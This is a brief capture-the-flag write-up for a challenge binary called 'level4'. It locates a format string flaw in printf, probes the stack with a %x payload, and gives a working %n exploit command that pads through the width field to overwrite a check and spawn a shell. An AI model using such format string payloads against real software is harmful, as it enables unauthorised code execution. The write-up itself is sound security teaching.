# Write up

After dissassembling the `level4` binary, we notice an unsecure printf call and a condition to activate a shell again.
But this time, it's harder since the checked value is very high, we can't print 16930116 (1025544 in hex) chars since it will be cutted to 512 by the fgets call.

Same routine, we try a placeholder payload : 
```
AAAA.%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA.b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 2078252e 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
```
Which gives us a vulnerable parameter at the 12th position.

However, this payload :
```
printf "%b%16930052s%s" "\x10\x98\x04\x08" "" "%x%x%x%x%x%x%x%x%x%x%x%n" | ./level4
```
Doesn't work because of the size.
But we can bypass the buff size limitation by putting the filling chars in the min width parameter instead of raw in the format :
```
(printf "%b%s" "\x10\x98\x04\x08" "%16930052d%x%x%x%x%x%x%x%x%x%x%n"; cat) | ./level4
```
Which gives us directly our flag.

## Sources

https://cs155.stanford.edu/papers/formatstring-1.2.pdf